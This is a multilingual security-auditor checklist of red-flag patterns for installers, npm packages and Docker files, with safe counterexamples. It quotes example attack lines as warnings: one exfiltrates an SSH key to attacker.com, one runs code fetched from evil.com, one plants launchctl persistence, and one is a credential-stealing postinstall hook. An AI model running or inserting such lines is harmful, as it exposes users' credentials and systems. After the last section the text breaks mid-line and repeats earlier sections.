# Red Flag Patterns — Security Auditor Reference

---

## 🚨 CRITICAL — Stop immediately
## 🚨 KRITICKÉ — Okamžitý stop (SK)
## 🚨 KRITICKÉ — Okamžitý stop (CZ)
## 🚨 KRITISCH — Sofort stoppen (DE)
## 🚨 CRITIQUE — Arrêt immédiat (FR)
## 🚨 CRITICO — Stop immediato (IT)
## 🚨 KRYTYCZNE — Natychmiastowe zatrzymanie (PL)
## 🚨 CRÍTICO — Detener inmediatamente (ES)

---

### 1. Data exfiltration / Exfiltrácia dát / Exfiltrace dat / Datenexfiltration / Exfiltration de données / Esfiltrazione dati / Eksfiltracja danych / Exfiltración de datos

> Reading SSH keys, env variables or macOS Keychain and sending them to an external server.
>
> Čítanie SSH kľúčov, env premenných alebo macOS Keychain a odosielanie na externý server.
>
> Čtení SSH klíčů, env proměnných nebo macOS Keychain a odesílání na externí server.
>
> Lesen von SSH-Schlüsseln, Umgebungsvariablen oder macOS Keychain und Senden an externen Server.
>
> Lecture des clés SSH, variables d'environnement ou macOS Keychain et envoi à un serveur externe.
>
> Lettura di chiavi SSH, variabili d'ambiente o macOS Keychain e invio a server esterno.
>
> Odczyt kluczy SSH, zmiennych środowiskowych lub macOS Keychain i wysyłanie na zewnętrzny serwer.
>
> Lectura de claves SSH, variables de entorno o macOS Keychain y envío a servidor externo.

```python
# Example of malicious code / Príklad škodlivého kódu
open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://attacker.com", data=key)
```

---

### 2. System persistence / Systémová perzistencia / Systémová perzistence / Systembeständigkeit / Persistance système / Persistenza di sistema / Trwałość systemu / Persistencia del sistema

> Runs malicious code automatically after every system restart.
>
> Spúšťa škodlivý kód automaticky po každom reštarte systému.
>
> Spouští škodlivý kód automaticky po každém restartu systému.
>
> Führt Schadcode nach jedem Systemstart automatisch aus.
>
> Exécute du code malveillant automatiquement après chaque redémarrage.
>
> Esegue codice dannoso automaticamente dopo ogni riavvio del sistema.
>
> Uruchamia złośliwy kod automatycznie po każdym restarcie systemu.
>
> Ejecuta código malicioso automáticamente tras cada reinicio del sistema.

```bash
# Red flag examples
launchctl load ~/Library/LaunchAgents/evil.plist
defaults write com.apple.loginitems ...
```

---

### 3. Obfuscation / Obfuskácia / Obfuskace / Verschleierung / Obfuscation / Offuscamento / Obfuskacja / Ofuscación

> Downloads and executes hidden code that cannot be reviewed before running.
>
> Stiahne a spustí skrytý kód, ktorý sa nedá skontrolovať pred spustením.
>
> Stáhne a spustí skrytý kód, který nelze zkontrolovat před spuštěním.
>
> Lädt versteckten Code herunter und führt ihn aus, ohne dass er vorher überprüft werden kann.
>
> Télécharge et exécute du code caché qui ne peut pas être vérifié avant l'exécution.
>
> Scarica ed esegue codice nascosto che non può essere verificato prima dell'esecuzione.
>
> Pobiera i uruchamia ukryty kod, który nie może być sprawdzony przed uruchomieniem.
>
> Descarga y ejecuta código oculto que no puede revisarse antes de ejecutarse.

```python
# Red flag examples
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0..."))
eval(requests.get("https://evil.com/payload").text)
```

---

### 4. Supply chain risk / Supply chain riziko / Supply chain riziko / Lieferkettenrisiko / Risque chaîne d'approvisionnement / Rischio supply chain / Ryzyko łańcucha dostaw / Riesgo cadena de suministro

> The installer downloads from a different repository than the one you audited.
>
> Installer stiahne súbory z iného repozitára než toho, ktorý si auditoval.
>
> Installer stáhne soubory z jiného repozitáře než toho, který jsi auditoval.
>
> Der Installer lädt Dateien aus einem anderen Repository als dem geprüften herunter.
>
> L'installateur télécharge depuis un dépôt différent de celui audité.
>
> L'installer scarica da un repository diverso da quello verificato.
>
> Installer pobiera pliki z innego repozytorium niż to, które sprawdzałeś.
>
> El instalador descarga desde un repositorio diferente al auditado.

```bash
# Red flag example
REPO_URL="https://github.com/some-other-author/different-repo"
git clone $REPO_URL   # you audited something else!
```

---

## ⚠️ MEDIUM RISK — Explain and let the user decide
## ⚠️ STREDNÉ RIZIKO — Vysvetli, nechaj rozhodnúť (SK)
## ⚠️ STŘEDNÍ RIZIKO — Vysvětli, nechej rozhodnout (CZ)
## ⚠️ MITTLERES RISIKO — Erklären und entscheiden lassen (DE)
## ⚠️ RISQUE MOYEN — Expliquer et laisser décider (FR)
## ⚠️ RISCHIO MEDIO — Spiegare e lasciare decidere (IT)
## ⚠️ ŚREDNIE RYZYKO — Wyjaśnij i pozwól zdecydować (PL)
## ⚠️ RIESGO MEDIO — Explicar y dejar decidir (ES)

---

### 5. Writing to system directories / Zápis do systémových priečinkov / Zápis do systémových adresářů / Schreiben in Systemverzeichnisse / Écriture dans répertoires système / Scrittura in directory di sistema / Zapis do katalogów systemowych / Escritura en directorios del sistema

> Copying files to `/usr/local/bin/` or `/etc/` without a clear documented reason.
>
> Kopírovanie súborov do `/usr/local/bin/` alebo `/etc/` bez jasného zdokumentovaného dôvodu.
>
> Kopírování souborů do `/usr/local/bin/` nebo `/etc/` bez jasného zdokumentovaného důvodu.
>
> Kopieren von Dateien nach `/usr/local/bin/` oder `/etc/` ohne klaren dokumentierten Grund.
>
> Copie de fichiers dans `/usr/local/bin/` ou `/etc/` sans raison clairement documentée.
>
> Copia di file in `/usr/local/bin/` o `/etc/` senza motivo chiaramente documentato.
>
> Kopiowanie plików do `/usr/local/bin/` lub `/etc/` bez wyraźnie udokumentowanego powodu.
>
> Copia de archivos en `/usr/local/bin/` o `/etc/` sin razón claramente documentada.

---

### 6. Ping home / Ping home / Ping home / Ping nach Hause / Ping maison / Ping a casa / Ping do domu / Ping a casa

> Sends installation data to the author's server without documentation or consent.
>
> Odosiela inštalačné dáta na server autora bez dokumentácie alebo súhlasu.
>
> Odesílá instalační data na server autora bez dokumentace nebo souhlasu.
>
> Sendet Installationsdaten ohne Dokumentation oder Zustimmung an den Server des Autors.
>
> Envoie des données d'installation au serveur de l'auteur sans documentation ni consentement.
>
> Invia dati di installazione al server dell'autore senza documentazione o consenso.
>
> Wysyła dane instalacyjne na serwer autora bez dokumentacji lub zgody.
>
> Envía datos de instalación al servidor del autor sin documentación ni consentimiento.

---

## ✅ ACCEPTABLE PATTERNS — These are safe
## ✅ AKCEPTOVATEĽNÉ VZORY — Toto je bezpečné (SK)
## ✅ PŘIJATELNÉ VZORY — Toto je bezpečné (CZ)
## ✅ AKZEPTABLE MUSTER — Das ist sicher (DE)
## ✅ MODÈLES ACCEPTABLES — C'est sûr (FR)
## ✅ PATTERN ACCETTABILI — Questo è sicuro (IT)
## ✅ AKCEPTOWALNE WZORCE — To jest bezpieczne (PL)
## ✅ PATRONES ACEPTABLES — Esto es seguro (ES)

---

### ✅ Temporary directories / Dočasné priečinky / Dočasné adresáře / Temporäre Verzeichnisse / Répertoires temporaires / Directory temporanee / Katalogi tymczasowe / Directorios temporales

> Cleanup after installation — completely normal and safe.
>
> Upratovanie po inštalácii — úplne normálne a bezpečné.
>
> Úklid po instalaci — zcela normální a bezpečné.

```bash
TEMP_DIR=$(mktemp -d)
trap "rm -rf ${TEMP_DIR}" EXIT
```

---

### ✅ Python virtual environment / Virtuálne prostredie / Virtuální prostředí / Virtuelle Umgebung / Environnement virtuel / Ambiente virtuale / Środowisko wirtualne / Entorno virtual

> Isolated from the rest of the system — safer than global installation.
>
> Izolované od zvyšku systému — bezpečnejšie než globálna inštalácia.
>
> Izolované od zbytku systému — bezpečnější než globální instalace.

```bash
python3 -m venv "${SKILL_DIR}/.venv"
```

---

### ✅ SSRF protection / SSRF ochrana / SSRF ochrana / SSRF-Schutz / Protection SSRF / Protezione SSRF / Ochrona SSRF / Protección SSRF

> Blocks access to private/internal IP addresses — positive security signal.
>
> Blokuje prístup na privátne/interné IP adresy — pozitívny bezpečnostný signál.
>
> Blokuje přístup na privátní/interní IP adresy — pozitivní bezpečnostní signál.

```python
ip = ipaddress.ip_address(resolved_ip)
if ip.is_private or ip.is_loopback:
    return {"error": "Blocked: private IP"}
```

---

### ✅ OAuth on localhost / OAuth na localhost / OAuth na localhost / OAuth auf localhost / OAuth sur localhost / OAuth su localhost / OAuth na localhost / OAuth en localhost

> Standard safe OAuth callback pattern — not a red flag.
>
> Štandardný bezpečný OAuth callback — nie je červená vlajka.
>
> Standardní bezpečný OAuth callback — není červená vlajka.

```python
OAUTH_REDIRECT_URI = "http://localhost:8085"
```

---

### ✅ Pinned version / Pinovaná verzia / Pinovaná verze / Fixierte Version / Version épinglée / Versione bloccata / Przypięta wersja / Versión fijada

> Installs a specific tested version, not a live unpredictable main branch.
>
> Inštaluje konkrétnu otestovanú verziu, nie živú nepredvídateľnú main vetvu.
>
> Instaluje konkrétní otestovanou verzi, ne živou nepředvídatelnou větev main.

```bash
REPO_TAG="${APP_TAG:-v1.6.0}"
git clone --branch "${REPO_TAG}"
```

---

## 📦 NPM SPECIFIC RISKS / Riziká špecifické pre npm / Rizika specifická pro npm / npm-spezifische Risiken / Risques spécifiques npm / Rischi specifici npm / Ryzyka specyficzne dla npm / Riesgos específicos de npm

---

### 7. Malicious install scripts / Škodlivé install skripty / Škodlivé install skripty / Schädliche Install-Skripte / Scripts d'installation malveillants / Script di installazione dannosi / Złośliwe skrypty instalacyjne / Scripts de instalación maliciosos

> `preinstall` and `postinstall` scripts run automatically during `npm install` without asking.
>
> `preinstall` a `postinstall` skripty sa spúšťajú automaticky počas `npm install` bez pýtania.
>
> `preinstall` a `postinstall` skripty se spouštějí automaticky během `npm install` bez dotazu.
>
> `preinstall`- und `postinstall`-Skripte werden automatisch bei `npm install` ausgeführt.
>
> Les scripts `preinstall` et `postinstall` s'exécutent automatiquement lors de `npm install`.
>
> Gli script `preinstall` e `postinstall` vengono eseguiti automaticamente durante `npm install`.
>
> Skrypty `preinstall` i `postinstall` uruchamiają się automatycznie podczas `npm install`.
>
> Los scripts `preinstall` y `postinstall` se ejecutan automáticamente durante `npm install`.

```json
// Red flag
"scripts": {
  "postinstall": "node steal-credentials.js"
}
```

---

### 8. Typosquatting / Typosquatting / Typosquatting / Typosquatting / Typosquatting / Typosquatting / Typosquatting / Typosquatting

> Package names that look like popular ones but are slightly misspelled — contain malware.
>
> Názvy balíkov ktoré vyzerajú ako populárne ale sú mierne preklep — obsahujú malware.
>
> Názvy balíčků které vypadají jako populární ale jsou mírně překlepem — obsahují malware.

```json
// Red flag — lodahs instead of lodash
"dependencies": {
  "lodahs": "^4.17.21"
}
```

---

### 9. Unpinned versions / Nepinované verzie / Nepinované verze / Nicht fixierte Versionen / Versions non épinglées / Versioni non bloccate / Nieprzypięte wersje / Versiones no fijadas

> Wildcard versions always install the latest — unpredictable and risky.
>
> Wildcard verzie vždy inštalujú najnovšiu — nepredvídateľné a rizikové.
>
> Zástupné verze vždy instalují nejnovější — nepředvídatelné a rizikové.

```json
// Red flag
"dependencies": {
  "some-package": "*"
}

// Safe
"dependencies": {
  "some-package": "4.17.21"
}
```

---

## 🐳 DOCKER SPECIFIC RISKS / Riziká špecifické pre Docker / Rizika specifická pro Docker / Docker-spezifische Risiken / Risques spécifiques Docker / Rischi specifici Docker / Ryzyka specyficzne dla Dockera / Riesgos específicos de Docker

---

### 10. Dangerous volume mounts / Nebezpečné volume mounty / Nebezpečné volume mounty / Gefährliche Volume-Mounts / Montages de volumes dangereux / Mount di volumi pericolosi / Niebezpieczne montowania woluminów / Montajes de volúmenes peligrosos

> Mounting the entire filesystem or SSH keys into the container gives it full access to your machine.
>
> Mountovanie celého filesystému alebo SSH kľúčov do kontajnera mu dáva plný prístup k tvojmu počítaču.
>
> Mountování celého filesystému nebo SSH klíčů do kontejneru mu dává plný přístup k vašemu počítači.

```yaml
# Critical red flags
volumes:
  - /:/host                    # entire filesystem
  - ~/.ssh:/root/.ssh          # SSH keys
  - ~/.aws:/root/.aws          # AWS credentials
```

---

### 11. Privileged container / Privilegovaný kontajner / Privilegovaný kontejner / Privilegierter Container / Conteneur privilégié / Container privilegiato / Kontener uprzywilejowany / Contenedor privilegiado

> A privileged container has full access to the host system — essentially bypasses all Docker security.
>
> Privilegovaný kontajner má plný prístup k hostiteľskému systému — obchádza všetku Docker bezpečnosť.
>
> Privilegovaný kontejner má plný přístup k hostitelskému systému — obchází veškeré zabezpečení Dockeru.

```yaml
# Critical red flag
services:
  app:
    privileged: true
```

---

### 12. Hardcoded secrets in Dockerfile / Hardcoded secrets v Dockerfile / Hardcoded secrets v Dockerfile / Hardcodierte Secrets im Dockerfile / Secrets codés en dur dans Dockerfile / Segreti hardcoded nel Dockerfile / Zakodowane sekrety w Dockerfile / Secretos codificados en Dockerfile

> Secrets baked into Docker images are visible to anyone who pulls the image.
>
> Secrets zabudované do Docker images sú viditeľné každému kto image stiahne.
>
> Secrets zabudované do Docker images jsou viditelné každému, kdo image stáhne.

```dockerfile
# Red flag
ENV API_KEY=sk-1234567890abcdef
ENV DATABASE_PASSWORD=mysecretpassword

# Safe — use runtime env variables instead
ENV API_KEY=""
```

---

### 13. Unknown base image / Neznámy base image / Neznámý base image / Unbekanntes Basis-Image / Image de base inconnue / Immagine base sconosciuta / Nieznany obraz bazowy / Imagen base desconocida

> Always prefer official images from Docker Hub with specific version tags.
>
> Vždy preferuj oficiálne images z Docker Hub s konkrétnymi verziami.
>
> Vždy preferuj oficiální images z Docker Hub s konkrétními verzemi.

```dockerfile
# Red flag
FROM somerandomperson/mysterious-base:latest

# Safe
FROM node:20-alpine
FROM python:3.11-slim
FROM ubuntu:22.04
```>
> Ejecuta código malicioso automáticamente tras cada reinicio del sistema.

```bash
# Red flag examples
launchctl load ~/Library/LaunchAgents/evil.plist
defaults write com.apple.loginitems ...
```

---

### 3. Obfuscation / Obfuskácia / Obfuskace / Verschleierung / Obfuscation / Offuscamento / Obfuskacja / Ofuscación

> Downloads and executes hidden code that cannot be reviewed before running.
>
> Stiahne a spustí skrytý kód, ktorý sa nedá skontrolovať pred spustením.
>
> Stáhne a spustí skrytý kód, který nelze zkontrolovat před spuštěním.
>
> Lädt versteckten Code herunter und führt ihn aus, ohne dass er vorher überprüft werden kann.
>
> Télécharge et exécute du code caché qui ne peut pas être vérifié avant l'exécution.
>
> Scarica ed esegue codice nascosto che non può essere verificato prima dell'esecuzione.
>
> Pobiera i uruchamia ukryty kod, który nie może być sprawdzony przed uruchomieniem.
>
> Descarga y ejecuta código oculto que no puede revisarse antes de ejecutarse.

```python
# Red flag examples
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0..."))
eval(requests.get("https://evil.com/payload").text)
```

---

### 4. Supply chain risk / Supply chain riziko / Supply chain riziko / Lieferkettenrisiko / Risque chaîne d'approvisionnement / Rischio supply chain / Ryzyko łańcucha dostaw / Riesgo cadena de suministro

> The installer downloads from a different repository than the one you audited.
>
> Installer stiahne súbory z iného repozitára než toho, ktorý si auditoval.
>
> Installer stáhne soubory z jiného repozitáře než toho, který jsi auditoval.
>
> Der Installer lädt Dateien aus einem anderen Repository als dem geprüften herunter.
>
> L'installateur télécharge depuis un dépôt différent de celui audité.
>
> L'installer scarica da un repository diverso da quello verificato.
>
> Installer pobiera pliki z innego repozytorium niż to, które sprawdzałeś.
>
> El instalador descarga desde un repositorio diferente al auditado.

```bash
# Red flag example
REPO_URL="https://github.com/some-other-author/different-repo"
git clone $REPO_URL   # you audited something else!
```

---

## ⚠️ MEDIUM RISK — Explain and let the user decide
## ⚠️ STREDNÉ RIZIKO — Vysvetli, nechaj rozhodnúť (SK)
## ⚠️ STŘEDNÍ RIZIKO — Vysvětli, nechej rozhodnout (CZ)
## ⚠️ MITTLERES RISIKO — Erklären und entscheiden lassen (DE)
## ⚠️ RISQUE MOYEN — Expliquer et laisser décider (FR)
## ⚠️ RISCHIO MEDIO — Spiegare e lasciare decidere (IT)
## ⚠️ ŚREDNIE RYZYKO — Wyjaśnij i pozwól zdecydować (PL)
## ⚠️ RIESGO MEDIO — Explicar y dejar decidir (ES)

---

### 5. Writing to system directories / Zápis do systémových priečinkov / Zápis do systémových adresářů / Schreiben in Systemverzeichnisse / Écriture dans répertoires système / Scrittura in directory di sistema / Zapis do katalogów systemowych / Escritura en directorios del sistema

> Copying files to `/usr/local/bin/` or `/etc/` without a clear documented reason.
>
> Kopírovanie súborov do `/usr/local/bin/` alebo `/etc/` bez jasného zdokumentovaného dôvodu.
>
> Kopírování souborů do `/usr/local/bin/` nebo `/etc/` bez jasného zdokumentovaného důvodu.
>
> Kopieren von Dateien nach `/usr/local/bin/` oder `/etc/` ohne klaren dokumentierten Grund.
>
> Copie de fichiers dans `/usr/local/bin/` ou `/etc/` sans raison clairement documentée.
>
> Copia di file in `/usr/local/bin/` o `/etc/` senza motivo chiaramente documentato.
>
> Kopiowanie plików do `/usr/local/bin/` lub `/etc/` bez wyraźnie udokumentowanego powodu.
>
> Copia de archivos en `/usr/local/bin/` o `/etc/` sin razón claramente documentada.

---

### 6. Ping home / Ping home / Ping home / Ping nach Hause / Ping maison / Ping a casa / Ping do domu / Ping a casa

> Sends installation data to the author's server without documentation or consent.
>
> Odosiela inštalačné dáta na server autora bez dokumentácie alebo súhlasu.
>
> Odesílá instalační data na server autora bez dokumentace nebo souhlasu.
>
> Sendet Installationsdaten ohne Dokumentation oder Zustimmung an den Server des Autors.
>
> Envoie des données d'installation au serveur de l'auteur sans documentation ni consentement.
>
> Invia dati di installazione al server dell'autore senza documentazione o consenso.
>
> Wysyła dane instalacyjne na serwer autora bez dokumentacji lub zgody.
>
> Envía datos de instalación al servidor del autor sin documentación ni consentimiento.

---

## ✅ ACCEPTABLE PATTERNS — These are safe
## ✅ AKCEPTOVATEĽNÉ VZORY — Toto je bezpečné (SK)
## ✅ PŘIJATELNÉ VZORY — Toto je bezpečné (CZ)
## ✅ AKZEPTABLE MUSTER — Das ist sicher (DE)
## ✅ MODÈLES ACCEPTABLES — C'est sûr (FR)
## ✅ PATTERN ACCETTABILI — Questo è sicuro (IT)
## ✅ AKCEPTOWALNE WZORCE — To jest bezpieczne (PL)
## ✅ PATRONES ACEPTABLES — Esto es seguro (ES)

---

### ✅ Temporary directories / Dočasné priečinky / Dočasné adresáře / Temporäre Verzeichnisse / Répertoires temporaires / Directory temporanee / Katalogi tymczasowe / Directorios temporales

> Cleanup after installation — completely normal and safe.
>
> Upratovanie po inštalácii — úplne normálne a bezpečné.
>
> Úklid po instalaci — zcela normální a bezpečné.

```bash
TEMP_DIR=$(mktemp -d)
trap "rm -rf ${TEMP_DIR}" EXIT
```

---

### ✅ Python virtual environment / Virtuálne prostredie / Virtuální prostředí / Virtuelle Umgebung / Environnement virtuel / Ambiente virtuale / Środowisko wirtualne / Entorno virtual

> Isolated from the rest of the system — safer than global installation.
>
> Izolované od zvyšku systému — bezpečnejšie než globálna inštalácia.
>
> Izolované od zbytku systému — bezpečnější než globální instalace.

```bash
python3 -m venv "${SKILL_DIR}/.venv"
```

---

### ✅ SSRF protection / SSRF ochrana / SSRF ochrana / SSRF-Schutz / Protection SSRF / Protezione SSRF / Ochrona SSRF / Protección SSRF

> Blocks access to private/internal IP addresses — positive security signal.
>
> Blokuje prístup na privátne/interné IP adresy — pozitívny bezpečnostný signál.
>
> Blokuje přístup na privátní/interní IP adresy — pozitivní bezpečnostní signál.

```python
ip = ipaddress.ip_address(resolved_ip)
if ip.is_private or ip.is_loopback:
    return {"error": "Blocked: private IP"}
```

---

### ✅ OAuth on localhost / OAuth na localhost / OAuth na localhost / OAuth auf localhost / OAuth sur localhost / OAuth su localhost / OAuth na localhost / OAuth en localhost

> Standard safe OAuth callback pattern — not a red flag.
>
> Štandardný bezpečný OAuth callback — nie je červená vlajka.
>
> Standardní bezpečný OAuth callback — není červená vlajka.

```python
OAUTH_REDIRECT_URI = "http://localhost:8085"
```

---

### ✅ Pinned version / Pinovaná verzia / Pinovaná verze / Fixierte Version / Version épinglée / Versione bloccata / Przypięta wersja / Versión fijada

> Installs a specific tested version, not a live unpredictable main branch.
>
> Inštaluje konkrétnu otestovanú verziu, nie živú nepredvídateľnú main vetvu.
>
> Instaluje konkrétní otestovanou verzi, ne živou nepředvídatelnou větev main.

```bash
REPO_TAG="${APP_TAG:-v1.6.0}"
git clone --branch "${REPO_TAG}"
```
